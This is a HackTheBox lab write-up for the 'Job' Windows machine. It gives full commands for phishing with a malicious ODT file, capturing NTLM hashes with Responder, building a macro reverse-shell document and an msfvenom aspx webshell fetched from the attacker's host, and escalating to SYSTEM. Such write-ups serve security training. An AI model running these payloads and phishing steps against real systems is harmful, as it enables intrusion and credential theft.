# [HackTheBox - Job](https://app.hackthebox.com/machines/Job)

![b7e7f7bd99b41a69580c344a96e11a66.png](/resources/b7e7f7bd99b41a69580c344a96e11a66.png)

## Table of Contents

- [Abstract](#abstract)
- [Enumeration](#enumeration)
- [Initial Access with ODT file to reverse shell](#initial-access-with-odt-file-to-reverse-shell)
- [Privilege Escalation - Webroot modification to SeImpersonatePrivilege](#privilege-escalation-webroot-modification-to-seimpersonateprivilege)
  - [Get shell as DefaultAppPool via webshell](#get-shell-as-defaultapppool-via-webshell)
  - [Become SYSTEM with SeImpersonatePrivilege](#become-system-with-seimpersonateprivilege)
- [Bonus - ODT attachment inspection](#bonus-odt-attachment-inspection)
  - [NTLM Theft ODT](#ntlm-theft-odt)
  - [Reverse Shell ODT](#reverse-shell-odt)

***
## Abstract
Job is a vulnlab machine imported to HackTheBox as a medium Windows box. I started with network enumeration using nmap, which showed the host was a Windows server running SMTP, HTTP, SMB, RDP, and WinRM.

During web enumeration I discovered an email address on the site that could be used for phishing via the exposed SMTP service. I used Metasploit’s "odt_badodt" module to craft a macro-embedded LibreOffice (.odt) file for a reverse shell and obtained an initial shell as "jack.black".

"jack.black" is a member of the "developers" group, which has Full Control over the webroot. I uploaded a webshell and gained a second reverse shell as "IIS APPPOOL\DefaultAppPool". This account has SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege, which I leveraged with Meterpreter’s getsystem (token impersonation) to escalate to SYSTEM and root the box.

## Enumeration

Starting with nmap port scanning and we can see that there are multiple ports opened including 25,80,445,3389 and 5985
```
nmap $IP
```
![0ff4321b40407db815d0281a3e16abb3.png](/resources/0ff4321b40407db815d0281a3e16abb3.png)

Then I did another scan but this time I specified all ports identified from previous scan and use `-sCV` for service enumeration and run nmap script engine but we did not get much return for this command so we gonna take a look at the website next.
```
nmap $IP -p 25,80,445,3389,5985 -sCV
```
![ff7ee6a85745d545270059d887bda175.png](/resources/ff7ee6a85745d545270059d887bda175.png)

On the website, we can see that we must send libre office (odt) file to career@job.local via SMTP protocol, classic phishing case it is.

![6776c064c11e7a6723686025fd527f94.png](/resources/6776c064c11e7a6723686025fd527f94.png)

Techstack of this website is nothing too special, everything is by default from IIS to Microsoft ASP.NET

![ceb607bb990ec0cfaad085e627d45c81.png](/resources/ceb607bb990ec0cfaad085e627d45c81.png)

First I will use the "odt_badodt" Metasploit module to quickly generate a LibreOffice file that references a non-existing object on our share to force NTLMv2 authentication; when Windows attempts to access the UNC path it sends an SMB authentication (NTLMSSP) containing the NTLMv2 challenge/response to the target host. (btw I had to run as root because of Permission denied error)
```
use auxiliary/fileformat/odt_badodt
set lhost tun0
set creator mark
set filename resume.odt
run
```
![9a42b89ba42ceeefc336b7eac3f5a27a.png](/resources/9a42b89ba42ceeefc336b7eac3f5a27a.png)

Then I set a responder to wait for the request on tun0 interface which is our HTB VPN interface.
```
sudo responder -I tun0
```

After responder is ready, We can send an email with an attachment to the server like this
```
sendemail -s $IP -f "mark <mark@job.vl>" -t career@job.local -o tls=no -m "Please review my resume senpai uwu" -a resume.odt 
```
![726803fe7c8f17c000b4b58b09721e92.png](/resources/726803fe7c8f17c000b4b58b09721e92.png)

And sure enough, the SMB authentication was sent from the machine back to us and we can see that "jack.black" was aggressively review our attachment.

![6e8a12a626c29932d1beba2db9e2dd5a.png](/resources/6e8a12a626c29932d1beba2db9e2dd5a.png)

I tried to crack the hash with John The Ripper given the infamous `rockyou.txt` wordlist but no luck which mean the password of this user is not in `rockyou.txt` wordlist so cracking is not the way.

![d2e532f4866ec92e387739b66f576361.png](/resources/d2e532f4866ec92e387739b66f576361.png)

## Initial Access with ODT file to reverse shell

Since we know that "jack.black" will definitely open any odt attachment we give to him so let's change the plan to make macro document that will trigger a reverse shell back to us upon opening 

Luckily for us that Metasploit got us cover with "openoffice_document_macro" module so we set a payload and send this as an email attachment again.
```
use multi/misc/openoffice_document_macro
set payload payload/windows/x64/shell/reverse_tcp
set LHOST tun0
set SRVPORT 80
set SRVHOST tun0
set URIPATH serve
run
```
![7a90282f11ae718fa08fafc379bca41d.png](/resources/7a90282f11ae718fa08fafc379bca41d.png)

Send email again with newly created document from metasploit  and we can see that we get a shell back as "jack.black" user as expected
```
sendemail -s $IP -f "mark <mark@job.vl>" -t career@job.local -o tls=no -m "Please review my resume senpai uwu" -a msf.odt
```
![6d8b39a46641294b7af51c93b88698fa.png](/resources/6d8b39a46641294b7af51c93b88698fa.png)

![2fe4b8d013519229ec52fb88c8fc9d3a.png](/resources/2fe4b8d013519229ec52fb88c8fc9d3a.png)

User flag is located on the desktop of this user so we can loot it and start enumerating for privilege escalation vector.

![38d94ac15fefb064c79b1258135e2ea2.png](/resources/38d94ac15fefb064c79b1258135e2ea2.png)

If normal shell is not enough, we can also change our payload to meterpreter to get a meterpreter session as well.

![9cbeb18d6f6024777201b5290417ca41.png](/resources/9cbeb18d6f6024777201b5290417ca41.png)

## Privilege Escalation - Webroot modification to SeImpersonatePrivilege 
### Get shell as DefaultAppPool via webshell
After exploring the machine, we can see that this user is in the "developers" group which have full access to "wwwroot" folder and thats mean we can do anything to this folder including drop a webshell on it.

![8ffd1c418cee011023c1695b24ed9c31.png](/resources/8ffd1c418cee011023c1695b24ed9c31.png)

Since the server is running IIS (which commonly hosts ASP.NET and executes .aspx pages), We can add an .aspx webshell and trigger it on our web browser which will triggered a reverse shell back to us. but first we need to create webshell first (alternatively you can use pre-made aspx shell like landanum for this as well)
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=5555 -f aspx > shell.aspx
```
![033fcfee46352a5d7717388c44239db3.png](/resources/033fcfee46352a5d7717388c44239db3.png)

We can use lolbin to download file or even PowerShell to the webroot folder and PowerShell is much more convenient for me. (or use upload function in meterpreter)
```
iwr http://10.10.14.101:8000/shell.aspx -o shell.aspx
```
![d6c4fb1716856d8cd8835dbe91a9ed78.png](/resources/d6c4fb1716856d8cd8835dbe91a9ed78.png)

Now we have our payload ready but we will also need to set up our listener and "multi/handler" module is the most suitable one for the payload we just created eariler.
```
use multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set lhost tun0
set lport 5555
run
```

I accessed the webshell in my browser, which triggered a reverse shell payload and spawned a new Meterpreter session. Interacting with the session shows we have a shell as "IIS APPPOOL\DefaultAppPool" — the application-pool identity for IIS. App-pool identities often have SeImpersonatePrivilege (allowing impersonation), which can be abused for token/privilege-stealing techniques.

![c9de59cf0261e68c96492617e9a8093c.png](/resources/c9de59cf0261e68c96492617e9a8093c.png)

### Become SYSTEM with SeImpersonatePrivilege
There are multiple tools that can be used to leverage 
SeImpersonatePrivilege and Meterpreter already have couple methods for that which we can just simply run a single command from meterpreter session and finger cross 🤞 we are SYSTEM now.
```
getsystem
```
![c66ee0736a8e9a37f08b1bdf716a7811.png](/resources/c66ee0736a8e9a37f08b1bdf716a7811.png)

Now we root the box and done :D

![c41327a9263c49e879d643a2b7e171b4.png](/resources/c41327a9263c49e879d643a2b7e171b4.png)

https://labs.hackthebox.com/achievement/machine/1438364/757
***
## Bonus - ODT attachment inspection
### NTLM Theft ODT
In metasploit, when we create a bad odt file, it will embeded an image that will load non-existing file on our share drive upon loading this document hence the SMB authentication to our responder. 

![724783bd163ef84d2f7d2392bf5ec306.png](/resources/724783bd163ef84d2f7d2392bf5ec306.png)

![7cb47e2111502893094c88016881d3fb.png](/resources/7cb47e2111502893094c88016881d3fb.png)

### Reverse Shell ODT
On the ODT file that responsible for reverse shell, it will be embeded as a macro which will automatically launched upon opening if Macro is enabled on the target. 

![7b07d8ce4d11f1b06574885369afe1db.png](/resources/7b07d8ce4d11f1b06574885369afe1db.png)

Inspecting the macro, we can see that there is "OnLoad" function that will check the OS of the target that opened this file and if it can run powershell then it will fetch and execute payload hosted on with metasploit. (This is a stager payload so it make sense that it will fetch another payload from the server upon execution)

![349a26ff5345cab7941ac7e697de490b.png](/resources/349a26ff5345cab7941ac7e697de490b.png)

The payload will attempt to bypass Scriptblock logging and Amsi before execute another powershell payload that was gzipped and base64 encoded.

![0e4d5802f4d1f8def35f2d32ed4c8d98.png](/resources/0e4d5802f4d1f8def35f2d32ed4c8d98.png)

The last payload will eventually inject shellcode into the memory and result in reverse shell between target host and our machine

![8f5d0b17bce4c7b29afe12fc1654dd2e.png](/resources/8f5d0b17bce4c7b29afe12fc1654dd2e.png)

That's it for today, peace!
* * *